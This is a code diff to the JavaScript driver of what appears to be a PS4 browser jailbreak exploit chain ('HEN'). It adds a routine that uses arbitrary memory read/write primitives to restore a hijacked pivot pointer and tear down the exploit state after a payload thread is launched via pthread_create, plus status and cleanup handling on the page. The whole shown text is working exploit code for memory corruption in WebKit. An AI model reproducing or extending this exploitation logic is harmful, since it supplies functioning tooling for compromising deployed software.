@@ -1,7 +1,7 @@
-import { establishPrimitive } from "./core.js?v=hen1402r1";
-import { installWindowP, pairStatus } from "./mem.js?v=hen1402r1";
-import { int64 } from "./int64.js?v=hen1402r1";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r1";
+import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r2";
+import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r2";
+import { int64 } from "./int64.js?v=hen1402r2";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r2";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
@@ -339,6 +339,44 @@ let mainMf = null,
   mainOrig = null,
   mainArmed = false;
 let pinRestore = null;
+
+function releaseWebKitHeap(p) {
+  let pivotRestored = !mainArmed;
+  try {
+    if (mainArmed && mainMf && mainOrig && p) {
+      p.write8(mainMf, mainOrig);
+      const restored = p.read8(mainMf);
+      if (!restored ||
+          (restored.low >>> 0) !== (mainOrig.low >>> 0) ||
+          (restored.hi >>> 0) !== (mainOrig.hi >>> 0)) {
+        return { pivotRestored: false, coreReleased: false };
+      }
+      mainArmed = false;
+      pivotRestored = true;
+    }
+  } catch (_) {
+    return { pivotRestored: false, coreReleased: false };
+  }
+
+  if (!pivotRestored)
+    return { pivotRestored: false, coreReleased: false };
+
+  let coreReleased = false;
+  try {
+    releasePrimitiveState();
+    coreReleased = true;
+  } catch (_) {
+    return { pivotRestored: true, coreReleased: false };
+  }
+  try { releaseWindowP(); } catch (_) {}
+  try { keepAlive.length = 0; } catch (_) {}
+  mainMf = null;
+  mainOrig = null;
+  try {
+    if (typeof globalThis.gc === "function") globalThis.gc();
+  } catch (_) {}
+  return { pivotRestored: pivotRestored, coreReleased: coreReleased };
+}
 
 let jbRestoreHook = null;
 let allDone = false,
@@ -977,11 +1015,12 @@ let allDone = false,
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
     }
     if (params.get("afterglow")) {
+      let cleanupSafe = false;
       /* Arming requires a step from the landing page. A probe
          (afterglow=probe) fires no trigger and patches nothing, so a restored
          page may run that. */
       try {
-        const ag = await import("./afterglow-g.js?v=hen1402r1");
+        const ag = await import("./afterglow-g.js?v=hen1402r2");
         // Exactly what afterglow reaches for, counted rather than guessed.
         const agCtx = {
           p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
@@ -1000,6 +1039,7 @@ let allDone = false,
             ? "pthread_create returned success; HEN status unconfirmed"
             : "corrected HEN thread did not start");
           payloadRunning = threadStarted;
+          cleanupSafe = threadStarted && result.defused === true;
         }
       } catch (agError) {
         mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
@@ -1008,6 +1048,26 @@ let allDone = false,
       mark("ONE-SHOT-END", payloadRunning
         ? "pthread_create returned; HEN status unconfirmed. Leave result on screen"
         : "No payload thread confirmed. Leave page open and fully power off PS4 before retry");
+      if (cleanupSafe) {
+        const released = releaseWebKitHeap(p);
+        if (!released.pivotRestored || !released.coreReleased) {
+          mark("WEBKIT-HEAP-RELEASE-FAILED",
+            "pivot=" + released.pivotRestored + " core=" + released.coreReleased);
+          try { clearInterval(watchdog); } catch (_) {}
+          showNotice("Cleanup did not finish. Keep the browser open, fully power off the PS4, and do not retry on this boot.");
+          finishUI(true);
+          return;
+        }
+        p = null;
+        mark("WEBKIT-HEAP-RELEASED",
+          "pivot=" + released.pivotRestored + " core=" + released.coreReleased);
+        try { clearInterval(watchdog); } catch (_) {}
+        finishUI(true);
+        setTimeout(function () {
+          try { location.replace("done.html?v=hen1402r2"); } catch (_) {}
+        }, 2000);
+        return;
+      }
       finishUI(payloadRunning);
       // Leave the actual outcome visible. The consumed same-tab token and
       // persistent cold-boot lock prevent a restored page from firing again.
